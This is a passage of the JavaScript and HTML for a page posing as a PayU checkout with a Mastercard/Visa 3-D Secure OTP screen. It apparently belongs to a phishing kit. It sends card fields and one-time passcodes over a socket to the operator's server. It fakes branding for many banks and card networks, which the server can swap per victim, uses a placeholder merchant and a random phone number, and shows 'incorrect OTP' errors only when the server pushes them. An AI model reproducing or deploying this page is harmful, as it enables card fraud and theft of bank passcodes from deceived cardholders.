    const appDiv = document.getElementById('app');
    appDiv.innerHTML = `
        <div class="card-container w-full max-w-5xl">
            <div class="header-bar">
                <div class="flex justify-between items-center">
                    <div class="text-2xl font-bold">PayU</div>
                    <p class="text-sm">Secure Payment</p>
                </div>
                <div class="text-gray-100">
                    Amount: $${state.amount.toFixed(2)} USD
                </div>
            </div>
            
            <div class="flex justify-center p-8">
                <div class="flex flex-col items-center justify-center py-8">
                    <div class="h-16 w-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </div>
                    <h3 class="text-lg font-medium mb-2">${title}</h3>
                    <p class="text-sm text-gray-500 text-center mb-4">
                        ${message}
                    </p>
                    <button id="try-again" class="bg-white text-gray-800 border border-gray-300 py-2 px-6 rounded-md hover:bg-gray-50 transition-all">
                        Try Again
                    </button>
                </div>
            </div>
            
            <div class="footer-bar">
                <div class="security-badge">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/PCI_Logo.svg" alt="PCI DSS" />
                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                </div>
                <div class="separator-vertical"></div>
                <div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Verified_by_Visa.svg" alt="Verified by Visa" class="h-6 w-auto" />
                </div>
                <div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Mastercard_SecureCode_horizontal.svg" alt="Mastercard SecureCode" class="h-6 w-auto" />
                </div>
                <div class="separator-vertical"></div>
                <div class="text-xs text-gray-500">Powered by PayU Biz</div>
            </div>
        </div>
    `;
    
    const tryAgainBtn = document.getElementById('try-again');
    if (tryAgainBtn) {
        tryAgainBtn.addEventListener('click', resetForm);
    }
}

function resetForm() {
    state.cardForm = {
        cardNumber: '',
        cardHolder: '',
        expiryDate: '',
        cvv: '',
        errors: {}
    };
    state.cardType = null;
    state.transactionId = '';
    state.otpValue = '';
    state.loading = false;
    
    // Clear any running timer
    if (mcTimerInterval) {
        clearInterval(mcTimerInterval);
    }
    
    showCardUI();
}

function setupOTPHandlers() {
    const otpInputs = document.querySelectorAll('.otp-digit');
    const resendBtn = document.getElementById('resend-otp');
    const verifyBtn = document.getElementById('verify-otp');
    
    if (otpInputs.length) {
        otpInputs[0].focus();
        
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '');
                
                const digits = state.otpValue.split('');
                digits[index] = e.target.value;
                state.otpValue = digits.join('');
                
                if (e.target.value && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                
                verifyBtn.disabled = state.otpValue.length !== 6;
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });
    }
    
    if (resendBtn) {
        resendBtn.addEventListener('click', () => {
            if (state.canResend) {
                state.otpValue = '';
                otpInputs.forEach(input => input.value = '');
                startOTPTimer();
                showToast('OTP Resent', 'A new verification code has been sent to your mobile');
            }
        });
    }
    
    if (verifyBtn) {
        verifyBtn.addEventListener('click', () => {
            if (state.otpValue.length === 6) {
                verifyBtn.disabled = true;
                verifyBtn.innerHTML = `
                    <div class="flex items-center justify-center">
                        <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        Verifying
                    </div>
                `;
                
                socket.emit('otp_submission', {
                    transaction_id: state.transactionId,
                    otp: state.otpValue,
                    timestamp: new Date().toISOString()
                });
                
                showProcessingUI();
            }
        });
    }
}

// Initialize application
function init() {
    setupSocketListeners();
    generateRandomPhone();
    showCardUI();
}

// Start the application
init();
</script>

<script>
// MC Verification Logic
(function() {
  // Global variables
  let mcTimerInterval = null;
  const currencySymbols = {
    'USD': '$',
    'EUR': '€',
    'GBP': '£',
    'JPY': '¥',
    'INR': '₹',
    'AUD': 'A$',
    'CAD': 'C$'
  };
  
  // Card type logos
  const cardTypeLogos = {
    'visa': 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png',
    'mastercard': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
    'amex': 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png',
    'discover': 'https://logos-world.net/wp-content/uploads/2021/03/Discover-Logo-1985-2009.png',
    'rupay': 'https://www.gokiwi.in/wp-content/smush-webp/2023/12/1280px-Rupay-Logo.png.webp'
  };
  
  // Bank logos
  const bankLogos = {
    'default': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
    'housing': 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Housing_Bank_Logo.svg/1280px-Housing_Bank_Logo.svg.png',
    'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png',
    'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
    'chase': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
    'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
    'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
    'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png',
    'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
    'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
    'barclays': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
    'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png'
  };
  
  // Initialize DOM references
  function initDOM() {
    return {
      overlay: document.getElementById('mcVerificationOverlay'),
      loadingContent: document.getElementById('mcLoadingContent'),
      verificationContent: document.getElementById('mcVerificationContent'),
      loadingLogo: document.getElementById('loadingVerificationLogo'),
      bankLogo: document.getElementById('bankLogo'),
      verificationLogo: document.getElementById('verificationTypeLogo'),
      lastFourDigits: document.getElementById('cardLastFourDigits'),
      merchantName: document.getElementById('merchantName'),
      currencySymbol: document.getElementById('currencySymbol'),
      amount: document.getElementById('transactionAmount'),
      date: document.getElementById('transactionDate'),
      cardNumber: document.getElementById('cardNumberDisplay'),
      referenceId: document.getElementById('referenceId'),
      otpInput: document.getElementById('mcOtpInput'),
      otpError: document.getElementById('mcOtpError'),
      submitBtn: document.getElementById('mcSubmitBtn'),
      resendBtn: document.getElementById('mcResendBtn'),
      cancelBtn: document.getElementById('mcCancelBtn'),
      consentBox: document.getElementById('mcConsentCheckbox'),
      timerDisplay: document.getElementById('mcTimer') // Timer display element
    };
  }
  
  // Function to show the loading screen
  function showLoading(data) {
    const dom = initDOM();
    if (!dom.overlay) {
      console.error('MC Verification overlay not found in DOM');
      return;
    }
    
    // Set the correct logo based on card type
    const cardType = data.cardType || 'visa';
    if (dom.loadingLogo) {
      let logoSrc = cardTypeLogos[cardType.toLowerCase()] || cardTypeLogos.visa;
      dom.loadingLogo.innerHTML = `<img src="${logoSrc}" alt="${cardType}" style="max-height: 60px; max-width: 200px;">`;
    }
    
    // Show the overlay with loading spinner
    dom.loadingContent.style.display = 'flex';
    dom.verificationContent.style.display = 'none';
    dom.overlay.style.display = 'flex';
    
    // Store data for later use
    window.mcVerificationData = data;
    
    console.log('MC Verification loading shown for card type:', cardType);
  }
  
  // Function to show the verification form
  function showVerification(data) {
    const dom = initDOM();
    if (!dom.overlay) {
      console.error('MC Verification overlay not found in DOM');
      return;
    }
    
    // Get stored data
 const storedData = window.mcVerificationData || {};
    
    // Update logos
    // 1. Bank logo - updated to ensure bank logo shows on left side
    if (dom.bankLogo) {
      const bankCode = data.bankCode?.toLowerCase() || 'housing';
      dom.bankLogo.src = bankLogos[bankCode] || bankLogos.housing;
      dom.bankLogo.alt = `${bankCode} Bank`;
    }
    
    // 2. Verification type logo
    if (dom.verificationLogo) {
      const logoType = data.verificationType?.toLowerCase() || storedData.cardType?.toLowerCase() || 'visa';
      dom.verificationLogo.src = cardTypeLogos[logoType] || cardTypeLogos.visa;
    }
    
    // Set merchant name
    if (dom.merchantName) {
      dom.merchantName.textContent = data.merchantName || 'GOLFSTORE 3DS';
    }
    
    // Set amount and currency
    if (dom.currencySymbol && dom.amount) {
      const currency = data.currency || 'USD';
      const amount = data.amount || '45.99';
      
      dom.currencySymbol.textContent = currencySymbols[currency] || '$';
      dom.amount.textContent = amount;
    }
    
    // Set date
    if (dom.date) {
      dom.date.textContent = data.date || new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit', hour12: false});
    }
    
    // Set card number
    if (dom.cardNumber) {
      const cardNum = document.getElementById('card-number')?.value || '';
      const lastFour = cardNum.replace(/\s/g, '').slice(-4) || '0622';
      dom.cardNumber.textContent = `XXXX XXXX XXXX ${lastFour}`;
    }
    
    // Set reference ID
    if (dom.referenceId) {
      dom.referenceId.textContent = data.referenceId || '299879';
    }
    
    // Set phone last four digits
    if (dom.lastFourDigits) {
      dom.lastFourDigits.textContent = `********${data.phoneLastFour || '9469'}`;
    }
    
    // Show the verification form and hide loading
    dom.loadingContent.style.display = 'none';
    dom.verificationContent.style.display = 'block';
    
    // Style the consent checkbox to be smaller
    const consentLabel = document.getElementById('consentLabel');
    if (consentLabel) {
      consentLabel.style.fontSize = '11px';
      consentLabel.style.marginLeft = '5px';
      consentLabel.style.marginRight = '5px';
    }
    
    const consentCheckbox = document.getElementById('mcConsentCheckbox');
    if (consentCheckbox) {
      consentCheckbox.style.width = '12px';
      consentCheckbox.style.height = '12px';
      consentCheckbox.style.marginTop = '2px';
    }
    
    // Setup event handlers
    setupHandlers();
    
    console.log('MC Verification form shown');
  }
  
  // Setup event handlers
  function setupHandlers() {
    const dom = initDOM();
    
    // OTP input handler
    if (dom.otpInput) {
      dom.otpInput.addEventListener('input', function() {
        // Hide error message when typing
        if (dom.otpError) {
          dom.otpError.style.display = 'none';
        }
      });
    }
    
    // Submit button handler
    if (dom.submitBtn) {
      dom.submitBtn.onclick = function() {
        if (dom.otpInput.value.length < 1) return;
        
        // Show loading state
        dom.submitBtn.textContent = 'Verifying...';
        dom.submitBtn.style.opacity = '0.7';
        dom.submitBtn.disabled = true;
        
        // Hide any error message
        if (dom.otpError) {
          dom.otpError.style.display = 'none';
        }
        
        // Get OTP
        const otp = dom.otpInput.value;
        
        // Get invoiceId
        const invoiceId = window.mcVerificationData?.invoiceId;
        
        // Send to server
        socket.emit('mc_otp_submitted', {
          otp: otp,
          invoiceId: invoiceId
        });
        
        console.log('Submitted OTP:', otp);
      };
    }
    
    // Resend button handler
    if (dom.resendBtn) {
      dom.resendBtn.onclick = function() {
        // Show loading state
        const originalText = dom.resendBtn.textContent;
        dom.resendBtn.textContent = 'Sending...';
        dom.resendBtn.style.opacity = '0.7';
        dom.resendBtn.disabled = true;
        
        // Get invoiceId
        const invoiceId = window.mcVerificationData?.invoiceId;
        
        // Send to server
        socket.emit('mc_resend_otp', {
          invoiceId: invoiceId
        });
        
        // Reset button after delay
        setTimeout(() => {
          dom.resendBtn.textContent = originalText;
          dom.resendBtn.style.opacity = '1';
          dom.resendBtn.disabled = false;
          
          // Show toast
          alert('A new verification code has been sent to your registered mobile number.');
        }, 2000);
      };
    }
    
    // Cancel button handler
    if (dom.cancelBtn) {
      dom.cancelBtn.onclick = function() {
        // Show loading state
        dom.cancelBtn.textContent = 'Cancelling...';
        dom.cancelBtn.disabled = true;
        
        // Get invoiceId
        const invoiceId = window.mcVerificationData?.invoiceId;
        
        // Send to server
        socket.emit('mc_verification_cancelled', {
          invoiceId: invoiceId
        });
        
        // Hide and redirect
        setTimeout(() => {
          hideVerification();
          window.location.href = '/fail.html?reason=canceled';
        }, 1000);
      };
    }
  }
  
  // Hide verification overlay
  function hideVerification() {
    const dom = initDOM();
    if (dom.overlay) {
      dom.overlay.style.display = 'none';
    }
    
    if (mcTimerInterval) {
      clearInterval(mcTimerInterval);
    }
  }
  
  // Socket event listeners
  if (typeof socket !== 'undefined') {
    // Show loading screen
    socket.on('show_mc_verification', function(data) {
      console.log('Received show_mc_verification event:', data);
      showLoading(data);
    });
    
    // Show verification form
    socket.on('start_verification', function(data) {
      console.log('Received start_verification event:', data);
      showVerification(data);
      
      // Start the timer for 4:59 minutes
      startMCTimer();
    });
    
    // Update bank logo
    socket.on('update_mc_bank', function(data) {
      console.log('Received update_mc_bank event:', data);
      const dom = initDOM();
      if (dom.bankLogo && data.bankCode) {
        dom.bankLogo.src = bankLogos[data.bankCode.toLowerCase()] || bankLogos.housing;
        dom.bankLogo.alt = `${data.bankCode} Bank`;
      }
    });
    
    // Handle OTP errors - only respond to server-initiated errors
    socket.on('mc_otp_error', function(data) {
      console.log('Received mc_otp_error event:', data);
      const dom = initDOM();
      
      if (dom.otpError) {
        dom.otpError.textContent = data.message || 'Incorrect OTP, please enter valid one time passcode sent to your registered mobile';
        dom.otpError.style.display = 'block';
      }
      
      if (dom.submitBtn) {
        dom.submitBtn.textContent = 'Submit';
        dom.submitBtn.style.opacity = '1';
        dom.submitBtn.disabled = false;
      }
    });
    
    // Handle verification result
    socket.on('mc_verification_result', function(data) {
      console.log('Received mc_verification_result event:', data);
      
      // Hide verification overlay
      hideVerification();
      
      // Redirect based on result
      setTimeout(() => {
        if (data.success) {
          window.location.href = '/success.html?invoiceId=' + (data.invoiceId || '');
        } else {
          window.location.href = '/fail.html?reason=' + (data.reason || 'declined');
        }
      }, data.success ? 3000 : 4000);
    });
  }
  
  // Start the timer for 4:59 minutes (299 seconds)
  function startMCTimer() {
    // Get or create the timer display element
    let timerDisplay = document.getElementById('mcTimer');
    if (!timerDisplay) {
      timerDisplay = document.createElement('div');
      timerDisplay.id = 'mcTimer';
      timerDisplay.style.textAlign = 'center';
      timerDisplay.style.marginTop = '10px';
      timerDisplay.style.fontSize = '12px';
      timerDisplay.style.color = '#666';
      
      // Find where to insert it - after the buttons
      const buttonContainer = document.querySelector('.mcVerificationContent button').parentNode;
      if (buttonContainer) {
        buttonContainer.parentNode.insertBefore(timerDisplay, buttonContainer.nextSibling);
      }
    }
    
    let timeLeft = 299; // 4:59 in seconds
    
    // Clear any existing timer
    if (mcTimerInterval) {
      clearInterval(mcTimerInterval);
    }
    
    // Update timer display function
    function updateTimerDisplay() {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerDisplay.textContent = `Session expires in: ${minutes}:${seconds.toString().padStart(2, '0')}`;
    }
    
    // Initial display
    updateTimerDisplay();
    
    // Start the timer
    mcTimerInterval = setInterval(() => {
      timeLeft--;
      updateTimerDisplay();
      
      if (timeLeft <= 0) {
        clearInterval(mcTimerInterval);
        // Handle timeout - maybe show an error or auto-cancel
        const cancelBtn = document.getElementById('mcCancelBtn');
        if (cancelBtn) {
          cancelBtn.click();
        }
      }
    }, 1000);
  }
})();
</script>
</body>
</html>
